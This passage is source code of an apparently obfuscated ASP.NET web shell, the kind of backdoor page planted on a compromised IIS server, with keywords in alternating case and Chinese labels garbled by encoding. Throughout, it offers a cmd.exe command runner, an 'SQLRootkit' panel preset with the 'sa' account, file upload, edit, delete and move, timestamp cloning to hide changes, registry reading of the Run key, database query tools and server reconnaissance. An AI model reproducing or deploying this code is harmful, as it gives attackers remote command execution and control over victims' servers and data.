								rEsPoNsE.WrItE("<td class=td2 align=center><FONT color=red><a href='?action=edit&src=" & fIlEpAtH2 & "' target='_blank'>�༭</a>-<a href='?action=cut&src=" & FiLePaTh2 & "' target='_blank'>����</a>-<a href='?action=copy&src=" & FiLePaTh2 & "' target='_blank'>ճ��</a>-<a href='?action=rename&src=" & fIlEpAtH2 & "' target='_blank'>������</a>-<a href='?action=down&src=" & FiLePaTh2 & "' onClick='return down(this);'>����</a>-<a href='?action=del&src=" & fIlEpAtH2 & "' onClick='return del(this);'>ɾ��</a></font></td></tr>")
							NeXt
						%>
					</tAbLe>
				</tD>
			</tR>
		</TaBlE>
		<sCrIpT LaNgUaGe="javascript">
			fUnCtIoN DeL()
			{
				iF(CoNfIrM("ȷ��ɾ����"))
				{
					ReTuRn tRuE;
				}
				eLsE
				{
					rEtUrN FaLsE;
				}
			}
			FuNcTiOn dOwN()
			{
				iF(CoNfIrM("����ļ�����10M�������ͨ��httpЭ�����أ�\n��Ҫ������"))
				{
					ReTuRn tRuE;
				}
				eLsE
				{
					rEtUrN FaLsE;
				}
			}
		</sCrIpT>
		<%
			cAsE "information"'̽�빦��
				dIm cIp,cP As sTrInG
				iF GeTiP()<>ReQuEsT.SeRvErVaRiAbLeS("REMOTE_ADDR") ThEn
					cIp=gEtIp()
					Cp=rEqUeSt.sErVeRvArIaBlEs("REMOTE_ADDR")
				ElSe
					CiP=ReQuEsT.SeRvErVaRiAbLeS("REMOTE_ADDR")
					Cp="None"
				eNd iF
		%>
		<TaBlE WiDtH="100%" bOrDeR="1" AlIgN="center" cElLpAdDiNg="0" CeLlSpAcInG="0">
			<tR>
				<tD ClAsS='tD1'>̽��</tD>
			</tR>
			<Tr>
				<Td cLaSs='Td2'>
					SeRvEr iP<Ul ClAsS='tD3'>
						<%=ReQuEsT.SeRvErVaRiAbLeS("LOCAL_ADDR")%>
					</Ul>
					MaChInE NaMe<uL cLaSs='Td3'>
						<%=eNvIrOnMeNt.mAcHiNeNaMe%>
					</uL>
					nEtWoRk nAmE<Ul ClAsS='tD3'>
						<%=EnViRoNmEnT.UsErDoMaInNaMe.tOsTrInG()%>
					</Ul>
					UsEr nAmE In ThIs pRoCeSs<uL ClAsS='tD3'>
						<%=EnViRoNmEnT.UsErNaMe%>
					</uL>
					oS VeRsIoN<Ul ClAsS='tD3'>
						<%=EnViRoNmEnT.OsVeRsIoN.ToStRiNg()%>
					</uL>
					sTaRtEd tImE<Ul ClAsS='tD3'>
						<%=GeTsTaRtEdTiMe(eNvIrOnMeNt.tIcKcOuNt)%>
						HoUrS</uL>
					sYsTeM TiMe<uL cLaSs='Td3'>
						<%=nOw%>
					</uL>
					iIs vErSiOn<uL cLaSs='Td3'>
						<%=rEqUeSt.sErVeRvArIaBlEs("SERVER_SOFTWARE")%>
					</uL>
					hTtPs<uL cLaSs='Td3'>
						<%=rEqUeSt.sErVeRvArIaBlEs("HTTPS")%>
					</uL>
					pAtH_InFo<uL cLaSs='Td3'>
						<%=rEqUeSt.sErVeRvArIaBlEs("PATH_INFO")%>
					</uL>
					PaTh_tRaNsLaTeD<Ul cLaSs='Td3'>
						<%=rEqUeSt.sErVeRvArIaBlEs("PATH_TRANSLATED")%>
					</uL>
					sErVeR_PoRt<uL cLaSs='Td3'>
						<%=rEqUeSt.sErVeRvArIaBlEs("SERVER_PORT")%>
					</uL>
					sEeSiOnId<uL cLaSs='Td3'>
						<%=sEsSiOn.sEsSiOnId%>
					</uL>
				</Td>
			</Tr>
			<tR>
				<tD ClAsS='tD1'>ClIeNt InFoMaTiOn</Td>
			</Tr>
			<tR>
				<tD ClAsS='tD2'>
					cLiEnT PrOxY<Ul ClAsS='tD3'>
						<%=cP%>
					</Ul>
					ClIeNt iP<Ul ClAsS='tD3'>
						<%=CiP%>
					</Ul>
					UsEr<uL cLaSs='Td3'>
						<%=rEqUeSt.sErVeRvArIaBlEs("HTTP_USER_AGENT")%>
					</uL>
				</Td>
			</Tr>
		</tAbLe>
		<% CaSe "cmd" 'cMd.nEt%>
		<tAbLe wIdTh="100%" BoRdEr="1" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<Tr>
				<Td ClAsS='tD1'>CmD.NeT</tD>
			</tR>
			<Tr>
				<Td cLaSs='Td2'>
					<fOrM rUnAt="server">
						cMd.eXe's pAtH:<uL>
							<aSp:tExTbOx iD="cmdpath" rUnAt="server" TeXt="cmd.exe" wIdTh="80%" />
						</Ul>
						CoMmAnD:<uL>
							<aSp:tExTbOx iD="cmd" rUnAt="server" WiDtH="80%" ClAsS="TextBox" />
							<AsP:BuTtOn iD="Button123" rUnAt="server" TeXt="Run" oNcLiCk="RunCMD" ClAsS="buttom" />
						</uL>
						<AsP:LaBeL Id="result" RuNaT="server" />
					</FoRm>
				</tD>
			</tR>
		</TaBlE>
		<% cAsE "sqlrootkit" 'SqLrOoTkIt.nEt%>
		<tAbLe wIdTh="100%" BoRdEr="1" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<Tr>
				<Td cLaSs='Td1' CoLsPaN="2">sQlRoOtKiT.NeT</tD>
			</tR>
			<Tr>
				<FoRm rUnAt="server">
					<Td cLaSs='Td2' VaLiGn="top" WiDtH="30%">
						HoSt:<Ul>
							<AsP:TeXtBoX Id="ip" RuNaT="server" wIdTh="80%" tExT="127.0.0.1" />
						</uL>
						SqL nAmE:<uL>
							<aSp:tExTbOx iD="SqlName" rUnAt="server" WiDtH="80%" TeXt='Sa' />
						</Ul>
						sQl PaSsWoRd:<Ul>
							<AsP:TeXtBoX Id="SqlPass" RuNaT="server" wIdTh="80%" />
						</Ul>
						CoMmAnD:<uL>
							<aSp:tExTbOx iD="Sqlcmd" rUnAt="server" WiDtH="80%" />
							<AsP:BuTtOn iD="ButtonSQL" rUnAt="server" TeXt="Run" oNcLiCk="RunSQLCMD" />
						</Ul>
					</Td>
					<tD ClAsS='tD2' vAlIgN="top" wIdTh="70%">
						<AsP:LaBeL Id="resultSQL" RuNaT="server" />
					</Td>
				</fOrM>
			</tR>
		</TaBlE>
		<%
			cAsE "del"
				DiM A As sTrInG
				a=rEqUeSt.qUeRyStRiNg("src")
				cAlL ExIsTdIr(a)
				cAlL DeL(A)  
				ReSpOnSe.wRiTe("<script>alert(""ɾ���ļ� " & rEpLaCe(a,"\","\\") & " �ɹ���"");location.href='"& ReQuEsT.SeRvErVaRiAbLeS("URL") & "?action=goto&src="& sErVeR.UrLeNcOdE(gEtPaReNtDiR(A)) &"'</script>")
			cAsE "copy"
				CaLl eXiStDiR(rEqUeSt.qUeRyStRiNg("src"))
				sEsSiOn("cutboard")="" & rEqUeSt.qUeRyStRiNg("src")
				ReSpOnSe.wRiTe("<script>alert('�ļ��Ѿ����Ƶ�������а壬����Ŀ���ļ��е�ճ�����ɣ�');location.href='JavaScript:self.close()';</script>")
			CaSe "cut"
				cAlL ExIsTdIr(ReQuEsT.QuErYsTrInG("src"))
				SeSsIoN("cutboard")="" & ReQuEsT.QuErYsTrInG("src")
				rEsPoNsE.WrItE("<script>alert('�ļ��Ѿ����е�������а壬����Ŀ���ļ��е�ճ�����ɣ�');location.href='JavaScript:self.close()';</script>")
			cAsE "plaster"
				DiM Ow aS InTeGeR
				iF ReQuEsT.FoRm("OverWrite")<>"" ThEn oW=1
				iF ReQuEsT.FoRm("Cancel")<>"" ThEn oW=2
				UrL=ReQuEsT.QuErYsTrInG("src")
				cAlL ExIsTdIr(uRl)
				dIm d aS StRiNg
				D=SeSsIoN("cutboard")
				iF LeFt(d,1)="" tHeN
					TeMp1=UrL & pAtH.GeTfIlEnAmE(MiD(RePlAcE(D,"",""),1,lEn(rEpLaCe(D,"",""))-1))
					TeMp2=UrL & rEpLaCe(pAtH.GeTfIlEnAmE(D),"","")
					If rIgHt(d,1)="\" ThEn   
						cAlL xExIsTdIr(tEmP1,oW)
						dIrEcToRy.mOvE(RePlAcE(D,"",""),tEmP1 & "\")  
						rEsPoNsE.WrItE("<script>alert('����  " & rEpLaCe(RePlAcE(D,"",""),"\","\\") & "  ��  " & rEpLaCe(tEmP1 & "\","\","\\") & "  �ɹ���');location.href='"& rEqUeSt.sErVeRvArIaBlEs("URL") & "?action=goto&src="& SeRvEr.uRlEnCoDe(uRl) &"'</script>")
					eLsE
						cAlL xExIsTdIr(tEmP2,oW)
						fIlE.MoVe(rEpLaCe(d,"",""),TeMp2)
						rEsPoNsE.WrItE("<script>alert('����  " & rEpLaCe(RePlAcE(D,"",""),"\","\\") & "  ��  " & rEpLaCe(TeMp2,"\","\\") & "  �ɹ���');location.href='"& ReQuEsT.SeRvErVaRiAbLeS("URL") & "?action=goto&src="& sErVeR.UrLeNcOdE(UrL) &"'</script>")
					EnD If
				ElSe
					tEmP1=uRl & PaTh.gEtFiLeNaMe(mId(rEpLaCe(d,"",""),1,LeN(RePlAcE(d,"",""))-1))
					tEmP2=uRl & PaTh.gEtFiLeNaMe(rEpLaCe(d,"",""))
					iF RiGhT(D,1)="\" tHeN 
						CaLl XeXiStDiR(TeMp1,Ow)
						DiReCtOrY.CrEaTeDiReCtOrY(TeMp1)
						CaLl CoPyDiR(RePlAcE(D,"",""),tEmP1 & "\")
						rEsPoNsE.WrItE("<script>alert('����  " & rEpLaCe(RePlAcE(D,"",""),"\","\\") & "  ��  " & rEpLaCe(tEmP1 & "\","\","\\") & "  �ɹ���');location.href='"& rEqUeSt.sErVeRvArIaBlEs("URL") & "?action=goto&src="& SeRvEr.uRlEnCoDe(uRl) &"'</script>")
					eLsE
						cAlL xExIsTdIr(tEmP2,oW)
						fIlE.CoPy(rEpLaCe(d,"",""),TeMp2)
						rEsPoNsE.WrItE("<script>alert('����  " & rEpLaCe(RePlAcE(D,"",""),"\","\\") & "  ��  " & rEpLaCe(TeMp2,"\","\\") & "  �ɹ���');location.href='"& ReQuEsT.SeRvErVaRiAbLeS("URL") & "?action=goto&src="& sErVeR.UrLeNcOdE(UrL) &"'</script>")
					EnD If
				EnD If
			cAsE "upfile"
				uRl=rEqUeSt.qUeRyStRiNg("src")
		%>
		<tAbLe wIdTh="100%" BoRdEr="1" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<Tr>
				<Td cLaSs='Td1'><%=uRl%></Td>
			</Tr>
			<tR>
				<tD ClAsS='tD2'>
					<FoRm NaMe="UpFileForm" EnCtYpE="multipart/form-data" MeThOd="post" AcTiOn="?src=<%=server.UrlEncode(url)%>" rUnAt="server"  oNsUbMiT="return checkname();">
						<InPuT nAmE="upfile" tYpE="file" iD="UpFile" rUnAt="server"> <iNpUt tYpE="submit" iD="UpFileSubit" vAlUe="Upload" rUnAt="server" OnSeRvErClIcK="UpLoad">
					</FoRm>
				</tD>
			</tR>
		</TaBlE>
		<%
			cAsE "new"
				uRl=rEqUeSt.qUeRyStRiNg("src")
		%>
		<tAbLe wIdTh="100%" BoRdEr="1" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<Tr>
				<Td cLaSs='Td1'><%=uRl%></Td>
			</Tr>
			<tR>
				<tD ClAsS='tD2'>
					<FoRm RuNaT="server">
						�ļ����ƣ�
						<aSp:tExTbOx iD="NewName" tExTmOdE="SingleLine" RuNaT="server" cLaSs="TextBox" />
						<AsP:RaDiObUtToN Id="NewFile" TeXt="�ļ�" rUnAt="server" GrOuPnAmE="New" cHeCkEd="true" />
						<AsP:RaDiObUtToN Id="NewDirectory" TeXt="Ŀ¼" rUnAt="server" GrOuPnAmE="New" />
						<aSp:bUtToN Id="NewButton" TeXt="Submit" RuNaT="server" CsScLaSs="buttom" OnClIcK="NewFD" />
						<InPuT nAmE="Src" tYpE="hidden" vAlUe="<%=url%>">
					</fOrM>
				</Td>
			</Tr>
		</tAbLe>
		<%
			CaSe "edit"
				dIm b aS StRiNg
				B=ReQuEsT.QuErYsTrInG("src")
				CaLl eXiStDiR(B)
				DiM MyReAd aS NeW sTrEaMrEaDeR(B,EnCoDiNg.dEfAuLt)
				fIlEpAtH.TeXt=b
				cOnTeNt.tExT=MyReAd.rEaDtOeNd
		%>
		<tAbLe wIdTh="100%" BoRdEr="1" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<Tr>
				<Td cLaSs='Td1'>�ļ��༭</Td>
			</Tr>
			<tR>
				<tD ClAsS='tD2'>
					<FoRm RuNaT="server">
						<aSp:tExTbOx cSsClAsS="TextBox" iD="filepath" RuNaT="server" wIdTh="100%" />
						<uL cLaSs='Td3'>
							<AsP:TeXtBoX Id="content" RoWs="33" tExTmOdE="MultiLine" rUnAt="server" WiDtH="95%" />
							<AsP:BuTtOn iD="a" tExT="Sumbit" rUnAt="server" oNcLiCk="Editor" />
						</Ul>
					</FoRm>
				</tD>
			</tR>
		</TaBlE>
		<%
  				MyReAd.cLoSe
			cAsE "rename"
				uRl=rEqUeSt.qUeRyStRiNg("src")
				If rEqUeSt.fOrM("name")="" ThEn
		%>
		<tAbLe wIdTh="100%" BoRdEr="1" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<Tr>
				<Td cLaSs='Td1'>������</tD>
			</tR>
			<Tr>
				<Td cLaSs='Td2'>
					<fOrM nAmE="formRn" mEtHoD="post" aCtIoN="?action=rename&src=<%=server.UrlEncode(request.QueryString("SrC"))%>" OnSuBmIt="return checkname();">
						<uL cLaSs='Td3'>
							<%=ReQuEsT.QuErYsTrInG("src")%>
						</uL>
						<uL cLaSs='Td3'>
							<%=GeTpArEnTdIr(rEqUeSt.qUeRyStRiNg("src"))%>
							<InPuT TyPe="text" NaMe="name"> <InPuT TyPe="submit" nAmE="Submit3" vAlUe="Submit">
						</Ul>
					</FoRm>
				</tD>
			</tR>
		</TaBlE>
		<sCrIpT LaNgUaGe="javascript">
			fUnCtIoN ChEcKnAmE()
			{
				iF(fOrMrN.NaMe.vAlUe=="")
				{
					aLeRt("�������ļ�����");
					ReTuRn fAlSe
				}
			}
		</sCrIpT>
		<%
				ElSe
					iF ReNaMe() ThEn
						rEsPoNsE.WrItE("<script>alert('������ " & rEpLaCe(UrL,"\","\\") & " Ϊ " & RePlAcE(GeTpArEnTdIr(uRl) & rEqUeSt.fOrM("name"),"\","\\") & " �ɹ�����ˢ�£�');location.href='JavaScript:self.close()';</script>")
					eLsE
						ReSpOnSe.wRiTe("<script>alert('����ͬ���ļ���������ʧ�� :(');location.href='JavaScript:self.close()';</script>")
					eNd iF
				eNd iF
			CaSe "samename"
				UrL=ReQuEsT.QuErYsTrInG("src")
		%>
		<DiV AlIgN="center" StYlE="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:200px">
			<tAbLe cLaSs="table1" cElLsPaCiNg="1" CeLlPaDdInG="1" wIdTh="473" BoRdEr="0" aLiGn="center">
				<tR>
					<Td>����ͬ���ļ�,�����ѡnO,���Զ����һ������ǰ׺</tD>
				<tR>
					<Td cLaSs="td2" aLiGn="center">
						<fOrM nAmE="form1" mEtHoD="post" aCtIoN="?action=plaster&src=<%=server.UrlEncode(url)%>">
							<InPuT NaMe="OverWrite" TyPe="submit" Id="OverWrite" vAlUe="Yes"> <InPuT NaMe="Cancel" TyPe="submit" iD="Cancel" vAlUe="No">
						</FoRm>
					</Td>
				</tR>
			</tAbLe>
		</dIv>
		<A HrEf="javascript:history.back(1);" sTyLe="color:#FF0000">����</A>
		<%
			cAsE "clonetime"'cLoNeTiMe
				tImE1.tExT=ReQuEsT.QuErYsTrInG("src")&"51j.aspx"
				tImE2.tExT=ReQuEsT.QuErYsTrInG("src")
		%>
		<TaBlE WiDtH="100%" bOrDeR="1" AlIgN="center" cElLpAdDiNg="0" CeLlSpAcInG="0">
			<tR>
				<tD ClAsS='tD1'>�ļ������޸�</tD>
			</tR>
			<Tr>
				<Td cLaSs='Td2'>
					<fOrM rUnAt="server">
						�Լ�<Ul>
							<AsP:TeXtBoX Id="time1" RuNaT="server" wIdTh="90%" /></uL>
						Ŀ��<Ul>
							<AsP:TeXtBoX Id="time2" RuNaT="server" wIdTh="90%" /></uL>
						<AsP:BuTtOn iD="ButtonClone" tExT="Submit" RuNaT="server" oNcLiCk="CloneTime" />
					</fOrM>
				</Td>
			</Tr>
		</tAbLe>
		<% CaSe "reg"'ReAdReG %>
		<tAbLe wIdTh="100%" BoRdEr="1" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<Tr>
				<Td cLaSs='Td1'>ע������</tD>
			</tR>
			<Tr>
				<Td cLaSs='Td2'>
					<fOrM rUnAt="server">
						KeY :<uL>
							<aSp:tExTbOx iD="Reg1" rUnAt="server" WiDtH="90%" TeXt="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" />
						</Ul>
						VaLuE:<uL>
							<aSp:tExTbOx iD="Reg2" rUnAt="server" WiDtH="90%" TeXt="KAVRun" />
							<aSp:bUtToN Id="RegButtom" RuNaT="server" tExT="Sumbit" OnClIcK="ReadReg" />
						</uL>
					</fOrM>
					<Ul ClAsS='tD3'>
						<AsP:LaBeL Id="Label1" RuNaT="server" />
					</Ul>
				</tD>
			</tR>
		</TaBlE>
		<% cAsE "data" 'DaTaBaSe%>
		<tAbLe wIdTh="100%" BoRdEr="0" aLiGn="center" CeLlPaDdInG="0" cElLsPaCiNg="0">
			<FoRm rUnAt="server">
				<tR>
					<Td ClAsS='tD1'>���ݿ����<DiV AlIgN="right" StYlE="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:2px"><AsP:BuTtOn tExT="ReLoad" OnClIcK="DB_ReLoad" rUnAt="server" /></DiV>
					</tD>
				</Tr>
				<Tr>
					<tD cLaSs='Td2'>
						CoNnEcTiOn sTrInG :<Ul>
							<AsP:TeXtBoX Id="DB_CString" WiDtH="90%" rUnAt="server" />
						</uL>
						SeLeCt DaTaBaSe:<Ul>
							<AsP:RaDiObUtToN Id="DB_rB_MSSQL" TeXt="MSSQL" gRoUpNaMe="DBSelecting" OnChEcKeDcHaNgEd="DB_onrB_1"
								AuToPoStBaCk="true" RuNaT="server" />
							<AsP:RaDiObUtToN Id="DB_rB_Access" TeXt="Access" gRoUpNaMe="DBSelecting" OnChEcKeDcHaNgEd="DB_onrB_2"
								AuToPoStBaCk="true" RuNaT="server" />
							<AsP:BuTtOn iD="DB_sButton" rUnAt="server" tExT="Submit" oNcLiCk="DB_onsB" />
						</Ul>
						<aSp:lAbEl iD="db_Label" rUnAt="server" />
						<AsP:LaBeL Id="DB_exe" TeXt="Execute SQL ( No echo ): " vIsIbLe="false" RuNaT="server" />
						<Ul>
							<AsP:TeXtBoX Id="DB_EString" WiDtH="90%" rUnAt="server" vIsIbLe="false" />
							<aSp:bUtToN Id="DB_eButton" RuNaT="server" TeXt="Submit" ViSiBlE="false" oNcLiCk="DB_oneB" />
						</Ul>
						<Ul ClAsS='tD3'>
							<aSp:dAtAgRiD Id="DB_DataGrid" WiTh="100%" aLlOwPaGiNg="true" AlLoWsOrTiNg="true" oNsOrTcOmMaNd="DB_Sort"
								PaGeSiZe="10" OnPaGeInDeXcHaNgEd="DB_Page" pAgErStYlE-MoDe="NumericPages" RuNaT="server" />
						</uL>
					</tD>
				</Tr>
			</FoRm>
		</tAbLe>
		<%
				cAsE "logout"
   					sEsSiOn.aBaNdOn()
					rEsPoNsE.WrItE("<script>alert('��־��������?');location.href='" & rEqUeSt.sErVeRvArIaBlEs("URL") & "';</sc" & "ript>")
				eNd sElEcT
			EnD If
			cAtCh eRrOr_x
				ReSpOnSe.wRiTe("<font color=""red"">����</font>"&ErRoR_X.MeSsAgE)
			eNd tRy
		%>
		<sCrIpT LaNgUaGe="javascript">
			fUnCtIoN ClOsEwInDoW()
			{
				sElF.ClOsE();
			}
		</ScRiPt>
	</BoDy>
</hTmL>